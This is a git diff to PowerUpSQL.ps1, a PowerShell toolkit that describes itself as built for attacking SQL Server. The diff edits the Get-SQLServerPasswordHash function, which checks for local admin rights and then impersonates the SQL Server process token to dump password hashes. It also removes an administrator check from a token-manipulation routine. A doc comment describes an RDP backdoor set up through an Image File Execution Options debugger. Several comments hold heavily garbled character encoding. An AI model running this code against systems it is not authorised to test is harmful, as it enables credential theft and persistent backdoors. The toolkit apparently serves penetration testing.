@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.66
+        Version: 1.0.0.67
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -11223,14 +11223,45 @@ Function  Get-SQLServerPasswordHash
             # If the migrate flag is set dont't return and attempt to migrate
             if($Migrate)
             {
-                Write-Verbose -Message "$Instance : Attempting to impersonate SQL Server process..." 
+                # Verify local administrator privileges
+                $WinCurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                $WinCurrentUserName = $WinCurrentUser.name
+                $WinGroups = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($WinCurrentUser)
+                $WinRoleCheck = [System.Security.Principal.WindowsBuiltInRole]::Administrator
+                $IsAdmin = $WinGroups.IsInRole($WinRoleCheck)
+                
+                # Return if the current user does not have local admin privs
+                if($IsAdmin -ne $true){
+                    write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
+                        return
+                }else{
+                    write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
+                }
+
+                # Check for running sql service processes that match the instance
+                Write-Verbose -Message "$Instance : Impersonating SQL Server process:" 
                 [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
+                [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
+                
+                # Return if no matches exist
                 if ($TargetPid -eq 0){
                     Write-Verbose -Message "$Instance : No process running for provided instance..."
                     return
                 }
-                Write-Verbose -Message "$Instance : Targeting process id $TargetPid..."
-                Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser  | Out-Null               
+
+                # Status user if a match is found
+                Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
+                Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
+                
+                # Attempt impersonation 
+                try{
+                    Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
+                }catch{
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose -Message "$Instance : Impersonation failed."
+                    Write-Verbose  -Message " $Instance : $ErrorMessage"
+                    return
+                }
             }else{            
                 return
             }
@@ -11248,13 +11279,53 @@ Function  Get-SQLServerPasswordHash
             Write-Verbose -Message "$Instance : You are not a sysadmin."
             if($Migrate)
             {
-                Write-Verbose -Message "$Instance : Attempting to impersonate SQL Server process..."
+                # Verify local administrator privileges
+                $WinCurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                $WinCurrentUserName = $WinCurrentUser.name
+                $WinGroups = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($WinCurrentUser)
+                $WinRoleCheck = [System.Security.Principal.WindowsBuiltInRole]::Administrator
+                $IsAdmin = $WinGroups.IsInRole($WinRoleCheck)
+                
+                # Return if the current user does not have local admin privs
+                if($IsAdmin -ne $true){
+                    write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
+                        return
+                }else{
+                    write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
+                }
+
+                # Check for running sql service processes that match the instance
+                 Write-Verbose -Message "$Instance : Impersonating SQL Server process:"  
                 [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
-                Write-Verbose -Message "$Instance : Targeting process id $TargetPid..."                
-                Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser  | Out-Null
+                [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
+                
+                # Return if no matches exist
+                if ($TargetPid -eq 0){
+                    Write-Verbose -Message "$Instance : No process running for provided instance..."
+                    return
+                }
+
+                # Status user if a match is found
+                Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
+                Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
+                
+                # Attempt impersonation 
+                try{
+                    Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
+                }catch{
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose -Message "$Instance : Impersonation failed."
+                    Write-Verbose  -Message " $Instance : $ErrorMessage"
+                    return
+                }
+            }else{
+                return
             }
         
         }
+
+        # Status user
+        Write-Verbose -Message "$Instance : Attempting to dump password hashes."
 
         # Check version
         $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
@@ -11320,16 +11391,28 @@ Function  Get-SQLServerPasswordHash
             [string]$_.PasswordHash)
         }
 
+        # Status user
+        Write-Verbose -Message "$Instance : Attempt complete."
+        
         # Revert to original user context
-        if($Migrate){            
+        if($Migrate){          
             Invoke-TokenManipulation -RevToSelf | Out-Null
-        }
+        }       
     }
 
     End
     {
-        # Return data
-        $TblPasswordHashes
+
+        # Get hash count
+        $PasswordHashCount = $TblPasswordHashes.Rows.Count
+        write-verbose "$PasswordHashCount password hashes recovered."
+
+        # Return table if hashes exist
+        if($PasswordHashCount -gt 0){
+
+            # Return data
+            $TblPasswordHashes            
+        }
     }
 }
 
@@ -11546,7 +11629,7 @@ Function   Get-SQLPersistRegDebugger
             .SYNOPSIS
             This function uses xp_regwrite to configure a debugger for a provided 
             executable (utilman.exe by default), which will run another provided 
-            executable (cmd.exe by default) when itÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢s called. It is commonly used 
+            executable (cmd.exe by default) when itÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢s called. It is commonly used 
             to create RDP backdoors. The specific registry key is 
             HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options[EXE].  
             Sysadmin privileges are required.
@@ -17740,12 +17823,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
 
     #Main function
     function Main
-    {
-        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-        {
-            Write-Error "Script must be run as administrator" -ErrorAction Stop
-        }
-
+    {   
         #If running in session 0, force NoUI
         if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
         {
@@ -17904,7 +17982,7 @@ function Test-IsLuhnValid
             .OUTPUTS
             System.Boolean
             .NOTES
-            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¹ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã…â€œYVIND KALLSTAD
+            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¹ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“YVIND KALLSTAD
             Date: 19.02.2016
             Version: 1.0
             Dependencies: Get-LuhnCheckSum, ConvertTo-Digits
@@ -17939,7 +18017,7 @@ function Test-IsLuhnValid
 # -------------------------------------------
 # Function: ConvertTo-Digits
 # -------------------------------------------
-# Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¹ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã…â€œYVIND KALLSTAD
+# Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¹ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“YVIND KALLSTAD
 # Source: https://communary.net/2016/02/19/the-luhn-algorithm/
 function ConvertTo-Digits
 {
@@ -17956,7 +18034,7 @@ function ConvertTo-Digits
             https://communary.wordpress.com/
             https://github.com/gravejester/Communary.ToolBox
             .NOTES
-            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¹ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã…â€œYVIND KALLSTAD
+            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¹ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“YVIND KALLSTAD
             Date: 09.05.2015
             Version: 1.0
     #>
